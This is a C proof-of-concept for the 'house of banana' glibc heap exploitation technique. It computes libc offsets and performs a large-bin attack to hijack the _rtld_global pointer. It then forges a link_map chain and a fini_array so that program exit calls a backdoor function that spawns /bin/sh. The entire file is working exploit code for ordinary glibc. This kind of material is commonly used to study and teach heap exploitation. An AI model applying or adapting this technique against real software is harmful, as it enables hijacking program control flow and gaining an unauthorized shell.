#include <stdio.h>
#include <stdlib.h>

void backdoor() {
   puts("you hacked me!!");
   system("/bin/sh");
}

int main() {
   puts("house of banana's poc");
   size_t libc_base = &puts - 0x87490;
   size_t _rtld_global_ptr_addr = libc_base + 0x227060;
   char *ptr0 = malloc(0x450);
   char *gap = malloc(0x10);
   char *ptr1 = malloc(0x440);
   gap = malloc(0x10);
   char *ptr2 = malloc(0x410);
   gap = malloc(0x10);

   free(ptr0);
   //put ptr9 into large bin
   malloc(0x500);
   free(ptr1); //free ptr1 into unsorted bin
   free(ptr2); //free ptr2 into unsorted bin
   //bk_nextsize = _rtld_global_ptr_addr
   *(size_t *)(ptr0 + 0x18) = _rtld_global_ptr_addr - 0x20;
   malloc(0x410); //large bin attack to  hijack _rtld_global_ptr

   //fake a _rtld_global
   size_t fake_rtld_global_addr = ptr1 - 0x10;
   size_t *fake_rtld_global = (size_t *)ptr1;
   char buf[0x100];
   //the chain's length must >= 4
   fake_rtld_global[1] = &fake_rtld_global[2];
   fake_rtld_global[3] = fake_rtld_global_addr;

   fake_rtld_global[2+3] = &fake_rtld_global[3];
   fake_rtld_global[2+5] = &fake_rtld_global[2];

   fake_rtld_global[3+3] = &fake_rtld_global[8];
   fake_rtld_global[3+5] = &fake_rtld_global[3];

   fake_rtld_global[8+3] = 0;
   fake_rtld_global[8+5] = &fake_rtld_global[8];


   //fake a fini_array segment
   fake_rtld_global[0x20] = &fake_rtld_global[0x30];
   fake_rtld_global[0x22] = &fake_rtld_global[0x23];
   fake_rtld_global[0x23+1] = 0x8; //func ptrs total len


   fake_rtld_global[0x30] = 0x1A;
   fake_rtld_global[0x31] = 0;
   fake_rtld_global[-2] = &fake_rtld_global[0x32];

   //funcs
   fake_rtld_global[0x32] = backdoor;


   fake_rtld_global[0x61] = 0x800000000;
}
